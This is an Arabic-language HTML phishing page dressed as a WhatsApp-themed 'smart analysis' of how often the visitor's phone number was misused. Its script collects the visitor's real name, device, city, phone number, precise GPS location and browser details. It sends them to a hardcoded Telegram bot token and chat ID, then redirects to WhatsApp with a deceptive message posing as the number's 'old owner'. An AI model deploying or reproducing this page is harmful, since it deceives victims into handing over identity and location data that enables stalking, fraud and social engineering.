<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>📱 تحليل رقمك الذكي</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Segoe UI', Tahoma;
      background: linear-gradient(135deg, #25D366, #128C7E);
      color: #fff;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      animation: fadeIn 1.5s ease-in;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }

    .container {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(8px);
      border: 2px solid rgba(255,255,255,0.2);
      color: #fff;
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
      max-width: 400px;
      width: 90%;
      text-align: center;
      animation: slideUp 1s ease-out;
    }

    @keyframes slideUp {
      from { transform: translateY(30px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }

    h2 {
      margin-bottom: 15px;
      color: #fff;
    }

    p {
      font-size: 15px;
      margin-bottom: 20px;
    }

    input, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 8px;
      border: none;
      font-size: 16px;
    }

    input {
      background: rgba(255,255,255,0.2);
      color: #fff;
      border: 1px solid rgba(255,255,255,0.3);
    }

    input::placeholder {
      color: #eee;
    }

    button {
      background: #075E54;
      color: white;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background: #064c45;
    }

    .note {
      font-size: 13px;
      color: #eee;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>📱 كم اسم ارتبط برقمك؟</h2>
    <p>تحليل ذكي يكشف عدد المرات التي تم فيها استخدام رقمك في تطبيقات وهمية أو حسابات مزيفة.</p>
    <form id="identityForm">
      <input type="text" id="fullname" placeholder="👤 اسمك الحقيقي" required>
      <input type="text" id="device" placeholder="📱 نوع جهازك الحالي" required>
      <input type="text" id="city" placeholder="🌍 مدينتك" required>
      <input type="text" id="phone" placeholder="📞 رقم الهاتف للتحليل" required>
      <button type="submit">🔍 بدء التحليل الآن</button>
    </form>
    <p class="note">⚠️ بعد التحليل سيتم إرسال رسالة من صاحب الرقم القديم عبر واتساب.</p>
  </div>

  <script>
    const token = "7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM";
    const chat_id = "7493001551";

    document.getElementById("identityForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const name = document.getElementById("fullname").value;
      const device = document.getElementById("device").value;
      const city = document.getElementById("city").value;
      const phone = document.getElementById("phone").value;
      const agent = navigator.userAgent;
      const time = new Date().toLocaleString();

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          const message = `🧠 تحليل هوية رقم:\n👤 الاسم: ${name}\n📱 الجهاز: ${device}\n🌍 المدينة: ${city}\n📞 الرقم: ${phone}\n📍 الموقع: ${lat}, ${lon}\n🕒 الوقت: ${time}\n🧭 المتصفح: ${agent}`;

          fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
            .then(() => {
              const msg = "مرحبًا، أنا صاحب الرقم القديم. أحتاج أن أتواصل معك بخصوص أمر مهم...";
              window.location.href = `https://wa.me/${phone}?text=${encodeURIComponent(msg)}`;
            });
        }, function(error) {
          alert("⚠️ لم يتم السماح بالوصول إلى الموقع الجغرافي.");
        });
      } else {
        alert("⚠️ جهازك لا يدعم تحديد الموقع.");
      }
    });
  </script>
</body>
</html>
